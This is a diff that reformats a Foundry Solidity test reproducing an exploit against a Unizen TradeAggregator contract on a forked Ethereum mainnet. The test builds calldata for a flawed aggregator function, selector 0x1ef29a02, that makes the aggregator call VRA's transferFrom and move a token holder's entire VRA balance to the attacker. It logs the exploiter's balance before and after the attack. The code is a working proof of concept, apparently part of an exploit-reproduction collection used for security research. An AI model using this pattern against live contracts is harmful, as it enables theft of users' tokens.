@@ -35,26 +35,19 @@ interface ITradeAggregator {
 }
 
 contract ContractTest is Test {
-    ITradeAggregator private constant TradeAggregator =
-        ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
-    IERC20 private constant VRA =
-        IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
-    address private constant tokenHolder =
-        0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;
+    ITradeAggregator private constant TradeAggregator = ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
+    IERC20 private constant VRA = IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
+    address private constant tokenHolder = 0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19393360);
+        vm.createSelectFork("mainnet", 19_393_360);
         vm.label(address(TradeAggregator), "TradeAggregator");
         vm.label(address(VRA), "VRA");
         vm.label(address(tokenHolder), "tokenHolder");
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Exploiter VRA balance before attack",
-            VRA.balanceOf(address(this)),
-            VRA.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter VRA balance before attack", VRA.balanceOf(address(this)), VRA.decimals());
 
         ITradeAggregator.Info memory info = ITradeAggregator.Info({
             to: address(this),
@@ -65,7 +58,7 @@ contract ContractTest is Test {
             structMember5: 186_783_104_413_296_096,
             uuid: "UNIZEN-CLI",
             apiId: 17,
-            userPSFee: 1_875
+            userPSFee: 1875
         });
 
         bytes memory callData = abi.encodeWithSignature(
@@ -77,29 +70,17 @@ contract ContractTest is Test {
             VRA.balanceOf(tokenHolder)
         );
 
-        ITradeAggregator.Call memory call = ITradeAggregator.Call({
-            target: address(VRA),
-            amount: 0,
-            data: callData
-        });
+        ITradeAggregator.Call memory call = ITradeAggregator.Call({target: address(VRA), amount: 0, data: callData});
 
         ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
         calls[0] = call;
 
-        bytes memory data = abi.encodeWithSelector(
-            bytes4(0x1ef29a02),
-            info,
-            calls
-        );
+        bytes memory data = abi.encodeWithSelector(bytes4(0x1ef29a02), info, calls);
 
         // Call to flawed function
-        (bool success, ) = address(TradeAggregator).call{value: 1 wei}(data);
+        (bool success,) = address(TradeAggregator).call{value: 1 wei}(data);
         require(success, "Call to TradeAggregator not successful");
 
-        emit log_named_decimal_uint(
-            "Exploiter VRA balance after attack",
-            VRA.balanceOf(address(this)),
-            VRA.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter VRA balance after attack", VRA.balanceOf(address(this)), VRA.decimals());
     }
 }
